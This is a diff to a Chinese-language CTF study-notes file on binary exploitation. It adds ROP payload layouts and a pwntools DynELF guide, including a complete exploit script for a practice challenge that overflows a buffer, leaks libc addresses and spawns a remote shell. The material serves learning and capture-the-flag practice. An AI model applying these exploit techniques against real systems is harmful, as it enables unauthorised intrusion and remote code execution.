@@ -9,11 +9,16 @@
 
 ### ROP
 
+> https://blog.csdn.net/weixin_42397925/article/details/116682773
+>
+> https://blog.csdn.net/weixin_46132162/article/details/128852442#t10
+
 + padding+rdi_ret+sh_str+ret+sys
 
 ### LeakLibc
 
 + padding+(canary+bit[if exist])+rdi_ret+puts_got+puts_plt+leak_print_addr
++ padding+p32(elf.plt['write'])+p32(elf.sym['vulnerable_function'])+p32(0x1)+p32(elf.got['write'])+p32(0x4)
 
 ### Canary leak
 
@@ -118,7 +123,6 @@ https://cloud.tencent.com/developer/article/1740319
 + 0x404040达到got.plt的exit函数 可构造返回函数ROP
 + 通过返回到main二次构造ROP 泄露libc_base后加上one_gadget构造exp
 
-
 ## 做题笔记-heap
 
 > https://bbs.kanxue.com/thread-246786.htm
@@ -144,4 +148,62 @@ https://cloud.tencent.com/developer/article/1740319
 
   patchelf --add-needed 你的目录/libpthread.so.0 ./pwn （如果提示没有libpthread.so.0的话）
   ```
-+
++ 
+
+## 技巧笔记
+
+### DynELF
+
++ 模板
+
+  ```python
+  p = remote(ip, port)
+
+  def leak(addr):
+         payload2leak_addr = “****” + pack(addr) + “****”
+         p.send(payload2leak_addr)
+         data = p.recv()
+         return data
+
+  d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)
+  system_addr = d.lookup('system', 'libc')
+  read_add = d.lookup('read','libc')
+  ```
++ 使用说明
+
+  * 使用DynELF时，我们需要使用一个leak函数作为必选参数，指向ELF文件的指针或者使用ELF类加载的目标文件至少提供一个作为可选参数，以初始化一个DynELF类的实例d。然后就可以通过这个实例d的方法lookup来搜寻libc库函数了。
+  * leak函数需要使用目标程序本身的漏洞泄露出由DynELF类传入的int型参数addr对应的内存地址中的数据。
+  * 由于DynELF会多次调用leak函数，这个 **函数必须能任意次使用** ，即不能泄露几个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等。
+  * write函数是最理想的，因为write函数的特点在于其输出完全由其参数size决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\0’, ‘\n’之类的字符影响；而puts, printf函数会受到诸如‘\0’, ‘\n’之类的字符影响，在对数据的读取和处理有一定的难度。
+  * 在信息泄露过程中，由于循环制造溢出，故可能会导致栈结构发生不可预料的变化，可以尝试调用目标二进制程序的_start函数来重新开始程序以恢复栈。
++ 例子
+
+  + ```python
+    from pwn import *
+    #context(os='linux', arch='i386', log_level='debug')
+    #io=process('./level4')
+    io=remote('node5.buuoj.cn',28132)
+    elf=ELF('./level4')
+
+    def leak(addr):
+    	payload=flat((cyclic(0x88+4)),elf.plt['write'],elf.sym['main'],1,addr,4)
+    	io.send(payload)
+    	sleep(0.01)
+    	leaked=io.recv(4)
+    	info('leaked->'+str(leaked))
+    	return leaked
+
+    d=DynELF(leak,elf=elf)
+    system_addr=d.lookup('system','libc')
+    info('system_addr->'+str(system_addr))
+    #on bss section get user input binsh str,remember to extend bss,and get 8 bytes
+    payload=flat(cyclic(0x88+4),elf.sym['read'],elf.sym['main'],0,elf.bss()+0x500,8)
+    io.send(payload)
+    io.send(b'/bin/sh\0')
+    #time to get the shell,remember again,binsh str in bss + 0x500 area
+    payload=flat(cyclic(0x88+4),system_addr,b'aaaa',elf.bss()+0x500)
+    io.send(payload)
+    io.interactive()
+
+    ```
+  + 需要注意的是：泄露的返回地址填main或者_start的地址，对于发出的binsh字符串要符合8大小
